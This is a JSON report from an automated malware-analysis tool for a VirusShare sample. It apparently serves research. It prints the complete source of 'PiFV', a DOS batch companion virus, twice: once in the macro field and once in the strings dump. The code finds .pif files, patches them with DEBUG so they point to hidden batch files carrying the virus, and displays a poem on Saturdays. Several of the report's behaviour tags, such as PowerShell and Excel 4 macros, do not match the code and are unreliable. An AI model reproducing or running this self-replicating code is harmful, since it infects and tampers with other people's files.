{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "COMMAND": "May run PowerShell commands",
            "call": "May call a DLL using Excel 4 Macros",
            "run": "May run an executable file or a system command"
        },
        "macro": "@echo off\n:: host filename...\nset pifvo=LIST.COM\n:: loop dispatcher...\nif '%1=='PiFV goto PiFV_%2\n:: run the virus!\nset _PiFV=\nif not exist %comspec% set comspec=C:\\COMMAND.COM%_PiFV%\n%comspec% /e:5000 /c %0 PiFV go>nul\nif exist PiFV! del PiFV!\n:: run the host\nset PiFVcl=%1 %2 %3 %4 %5 %6 %7 %8 %9\ncall %0 PiFV hst\nset PiFVo=\nset PiFVcl=\n:: check for activation...\necho.|date|find /i \"sat\">nul.PiFV\nif errorlevel 1 goto PiFV_end\necho.|time|find \"7\">nul.PiFV\nif errorlevel 1 goto PiFV_msg\nset PiFV=echo\ncls%_PiFV%\n%PiFV%.\n%PiFV% There once was an Otter named Oscer\n%PiFV% Who claimed to know how to make water.\n%PiFV% \"No more dams,\" he said, \"use my water instead!\"\n%PiFV% But the Elder Otter was not impressed.\npause>nul.PiFV\nset PiFV=\ngoto PiFV_end\n:PiFV_msg\necho [PiFV] by WaveFunc\ngoto PiFV_end\n:PiFV_hst\n%PiFVo% %PiFVcl%\ngoto PiFV_end\n:PiFV_go\nset PiFVh=%0\nif not exist %PiFVh% set PiFVh=%0.bat\nif not exist %PiFVh% exit\nfor %%a in (*.pif) do call %0 PiFV inf %%a\nexit PiFV\n:PiFV_inf\nset PiFVp=%3\n:: get victim filename and infection marker\n:: from PIF file using debug...\nif exist PiFV! goto PiFV_1\necho m 124,162 524>PiFV!\necho e 100 '@set fn='>>PiFV!\necho m 524,562 108>>PiFV!\necho n pifv$.bat>>PiFV!\necho rcx>>PiFV!\necho 47>>PiFV!\necho w>>PiFV!\necho m 55E,561 108>>PiFV!\necho e 10C 0>>PiFV!\necho n pifv$$.bat>>PiFV!\necho rcx>>PiFV!\necho 10>>PiFV!\necho w>>PiFV!\necho q>>PiFV!\n:PiFV_1\ndebug %PiFVp%<PiFV!>nul\ncall PiFV$\nset PiFVn=%fn%\ncall PiFV$$\nset PiFVi=%fn%\ndel PiFV$?.bat\n:: pifvn=orig filename\n:: pifvi=infection marker\n:: pifvp=pif filename\n:: pifvh=companion bat file\n:: skip infected or 'empty' pifs...\nif '%PiFVi%=='PiFV goto PiFV_end\nif '%PiFVn%==' goto PiFV_end\n:: don't shadow command.com (be nice)\necho %PiFVn%|find /i \"command\">nul\nif not errorlevel 1 goto PiFV_end\n:: infectable - create a companion batch...\n:: (the following code strips off the extension)\necho e 100 e8 16 00 b4 08 cd 21 3c 00 74 0c 3c 2e 74 08 88>PiFV$$\necho e 110 c2 b4 02 cd 21 eb ec cd 20 ba 21 01 b4 09 cd 21>>PiFV$$\necho e 120 c3 73 65 74 20 66 6e 3d 24 00>>PiFV$$\necho n pifv$.com>>PiFV$$\necho rcx>>PiFV$$\necho 2a>>PiFV$$\necho w>>PiFV$$\necho q>>PiFV$$\ndebug<PiFV$$>nul\necho %PiFVn%|PiFV$>PiFV$$.bat\ncall PiFV$$\nset PiFVb=%fn%.bat\ndel PiFV$?.*\n:: pifvb=new batch name\n:: do not shadow if comp has same name as host\nif %PiFVo%==%PiFVb% goto PiFV_end\nif exist %PiFVb% goto PiFV_end\necho @echo off>%PiFVb%\necho set pifvo=%pifvn%>>%PiFVb%\nfind \"PiFV\"<%PiFVh%>>%PiFVb%\nattrib %PiFVb% +h\n:: ...and point the PIF at the companion\necho e 15E 'PiFV',0>PiFV$$\necho e 124 '%PiFVb%',0>>PiFV$$\necho w>>PiFV$$\necho q>>PiFV$$\ndebug %PiFVp%<PiFV$$>nul\ndel PiFV$$\n:: I think we're done!\nexit PiFV\n:PiFV_end\n:: wonder how many bugs all this has in it? Only one\n:: way to find out..."
    },
    "filename": "VirusShare_22f60ea86d2d6e71b9790616a4ff54f9",
    "filesize": 2877,
    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
    "hashes": {
        "md5": "22f60ea86d2d6e71b9790616a4ff54f9",
        "sha1": "555d910512349ca44e32fbd1862dfc13bc516dc6",
        "sha256": "a1a061fe8a15c41060b540b0551058db7d29c10a58197703a607b747ccafac52"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "@echo off",
            ":: host filename...",
            "set pifvo=LIST.COM",
            ":: loop dispatcher...",
            "if '%1=='PiFV goto PiFV_%2",
            ":: run the virus!",
            "set _PiFV=",
            "if not exist %comspec% set comspec=C:\\COMMAND.COM%_PiFV%",
            "%comspec% /e:5000 /c %0 PiFV go>nul",
            "if exist PiFV! del PiFV!",
            ":: run the host",
            "set PiFVcl=%1 %2 %3 %4 %5 %6 %7 %8 %9",
            "call %0 PiFV hst",
            "set PiFVo=",
            "set PiFVcl=",
            ":: check for activation...",
            "echo.|date|find /i \"sat\">nul.PiFV",
            "if errorlevel 1 goto PiFV_end",
            "echo.|time|find \"7\">nul.PiFV",
            "if errorlevel 1 goto PiFV_msg",
            "set PiFV=echo",
            "cls%_PiFV%",
            "%PiFV%.",
            "%PiFV% There once was an Otter named Oscer",
            "%PiFV% Who claimed to know how to make water.",
            "%PiFV% \"No more dams,\" he said, \"use my water instead!\"",
            "%PiFV% But the Elder Otter was not impressed.",
            "pause>nul.PiFV",
            "set PiFV=",
            "goto PiFV_end",
            ":PiFV_msg",
            "echo [PiFV] by WaveFunc",
            "goto PiFV_end",
            ":PiFV_hst",
            "%PiFVo% %PiFVcl%",
            "goto PiFV_end",
            ":PiFV_go",
            "set PiFVh=%0",
            "if not exist %PiFVh% set PiFVh=%0.bat",
            "if not exist %PiFVh% exit",
            "for %%a in (*.pif) do call %0 PiFV inf %%a",
            "exit PiFV",
            ":PiFV_inf",
            "set PiFVp=%3",
            ":: get victim filename and infection marker",
            ":: from PIF file using debug...",
            "if exist PiFV! goto PiFV_1",
            "echo m 124,162 524>PiFV!",
            "echo e 100 '@set fn='>>PiFV!",
            "echo m 524,562 108>>PiFV!",
            "echo n pifv$.bat>>PiFV!",
            "echo rcx>>PiFV!",
            "echo 47>>PiFV!",
            "echo w>>PiFV!",
            "echo m 55E,561 108>>PiFV!",
            "echo e 10C 0>>PiFV!",
            "echo n pifv$$.bat>>PiFV!",
            "echo rcx>>PiFV!",
            "echo 10>>PiFV!",
            "echo w>>PiFV!",
            "echo q>>PiFV!",
            ":PiFV_1",
            "debug %PiFVp%<PiFV!>nul",
            "call PiFV$",
            "set PiFVn=%fn%",
            "call PiFV$$",
            "set PiFVi=%fn%",
            "del PiFV$?.bat",
            ":: pifvn=orig filename",
            ":: pifvi=infection marker",
            ":: pifvp=pif filename",
            ":: pifvh=companion bat file",
            ":: skip infected or 'empty' pifs...",
            "if '%PiFVi%=='PiFV goto PiFV_end",
            "if '%PiFVn%==' goto PiFV_end",
            ":: don't shadow command.com (be nice)",
            "echo %PiFVn%|find /i \"command\">nul",
            "if not errorlevel 1 goto PiFV_end",
            ":: infectable - create a companion batch...",
            ":: (the following code strips off the extension)",
            "echo e 100 e8 16 00 b4 08 cd 21 3c 00 74 0c 3c 2e 74 08 88>PiFV$$",
            "echo e 110 c2 b4 02 cd 21 eb ec cd 20 ba 21 01 b4 09 cd 21>>PiFV$$",
            "echo e 120 c3 73 65 74 20 66 6e 3d 24 00>>PiFV$$",
            "echo n pifv$.com>>PiFV$$",
            "echo rcx>>PiFV$$",
            "echo 2a>>PiFV$$",
            "echo w>>PiFV$$",
            "echo q>>PiFV$$",
            "debug<PiFV$$>nul",
            "echo %PiFVn%|PiFV$>PiFV$$.bat",
            "call PiFV$$",
            "set PiFVb=%fn%.bat",
            "del PiFV$?.*",
            ":: pifvb=new batch name",
            ":: do not shadow if comp has same name as host",
            "if %PiFVo%==%PiFVb% goto PiFV_end",
            "if exist %PiFVb% goto PiFV_end",
            "echo @echo off>%PiFVb%",
            "echo set pifvo=%pifvn%>>%PiFVb%",
            "find \"PiFV\"<%PiFVh%>>%PiFVb%",
            "attrib %PiFVb% +h",
            ":: ...and point the PIF at the companion",
            "echo e 15E 'PiFV',0>PiFV$$",
            "echo e 124 '%PiFVb%',0>>PiFV$$",
            "echo w>>PiFV$$",
            "echo q>>PiFV$$",
            "debug %PiFVp%<PiFV$$>nul",
            "del PiFV$$",
            ":: I think we're done!",
            "exit PiFV",
            ":PiFV_end",
            ":: wonder how many bugs all this has in it? Only one",
            ":: way to find out..."
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.282507",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
